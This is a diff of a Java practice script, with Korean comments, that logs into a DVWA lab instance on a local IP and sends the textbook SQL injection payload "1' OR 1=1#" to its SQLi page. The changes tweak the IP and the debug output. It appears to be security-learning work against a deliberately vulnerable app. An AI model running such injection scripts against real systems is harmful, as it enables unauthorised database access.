@@ -7,31 +7,26 @@ import java.util.*;
 import java.util.regex.*;
 
 public class SQLInjectionTrial {
-    private static final String BASE_URL = "http://192.168.219.103/DVWA";
+    private static final String BASE_URL = "http://192.168.219.105/DVWA";
     private static final String LOGIN_URL = BASE_URL + "/login.php";
     private static final String ATTACK_URL = BASE_URL + "/vulnerabilities/sqli/";
     private static String sessionCookie = null;
     private static String csrfToken = null;
     private static HttpURLConnection conn = null;
 
-    public static void main(String[] args) throws Exception {
-        SQLInjectionTrial trial = new SQLInjectionTrial();
-        trial.run();
-    }
-
-    public void run() throws Exception {
+    public void run() throws Exception {    	
         // 1️⃣ 로그인 및 세션 유지
         if (!login()) {
             System.out.println("로그인 실패! 공격 중단");
             return;
         }
-
+        
         // 2️⃣ SQL Injection 공격 실행
         String payload = URLEncoder.encode("1' OR 1=1#", StandardCharsets.UTF_8) + "&Submit=Submit#";
         sendAttack(payload);
     }
 
- // ✅ 로그인 처리 (세션 유지)
+    // ✅ 로그인 처리 (세션 유지)
     private boolean login() throws Exception {
         // 1️⃣ 로그인 페이지에서 CSRF 토큰 가져오기
         String loginPage = sendRequest(LOGIN_URL, "GET", null);
@@ -47,8 +42,8 @@ public class SQLInjectionTrial {
 
         // 3️⃣ 리디렉션 URL을 확인하여 로그인 성공 여부 판단
         Map<String, List<String>> headers = conn.getHeaderFields();
-        System.out.println(headers);
-        System.out.println(conn.getHeaderField("Set-Cookie"));
+        System.out.println("로그인 헤더: " + headers);
+//        System.out.println(conn.getHeaderField("Set-Cookie"));
         
         String redirectUrl = conn.getHeaderField("Location");
         if (redirectUrl != null && redirectUrl.contains("/index.php")) {
@@ -63,8 +58,7 @@ public class SQLInjectionTrial {
     private void sendAttack(String payload) throws Exception {
         String attackUrl = ATTACK_URL + "?id=" + payload;
         String response = sendRequest(attackUrl, "GET", null);
-        System.out.println("공격 응답:");
-        System.out.println(response);
+        System.out.println("공격 응답:" + response);
     }
 
     // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
@@ -75,23 +69,25 @@ public class SQLInjectionTrial {
         conn.setRequestProperty("User-Agent", "Mozilla/5.0");
         conn.setRequestProperty("Accept", "text/html");
         
+        
         // 🔥 기존 세션 쿠키 유지 (로그인 후 세션을 유지함)
+//        System.out.println("기존 헤더: " + conn.getRequestProperties());
+        System.out.println("쿠키: " + sessionCookie);
         if (sessionCookie != null) {
             conn.setRequestProperty("Cookie", sessionCookie);
         }
+        System.out.println("쿠키 채운 이후 헤더: " + conn.getRequestProperties());
         
      // ✅ 여기에서 로그인 요청 헤더 출력 (login.php 요청일 경우)
         if (urlString.contains("login.php")) {
             System.out.println("🔹 [로그인 요청] Request Headers:");
-            conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
-//            conn.getRequestProperties();
+//            conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
+            conn.getRequestProperties();
         }
-        
-//        Map<String, List<String>> headers = conn.getHeaderFields();
-//        System.out.println(headers);
 
         // 🔥 POST 요청 처리
         if ("POST".equals(method) && postData != null) {
+        	System.out.println("POST 작업");
             conn.setDoOutput(true);
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(postData.getBytes(StandardCharsets.UTF_8));
@@ -107,9 +103,10 @@ public class SQLInjectionTrial {
         }
         in.close();
 
-     // 🔥 로그인 후 쿠키 저장 (기존 세션 갱신)
+        // 🔥 로그인 후 쿠키 저장 (기존 세션 갱신)
         if (urlString.contains("login.php")) {
             Map<String, List<String>> headerFields = conn.getHeaderFields();
+            System.out.println("현재 헤더: " + headerFields);
             List<String> cookies = headerFields.get("Set-Cookie");
 
             if (cookies != null) {
@@ -123,8 +120,9 @@ public class SQLInjectionTrial {
                 }
             }
         }
-
+        
         return response.toString();
+        
     }
 
     // ✅ CSRF 토큰 추출 메서드
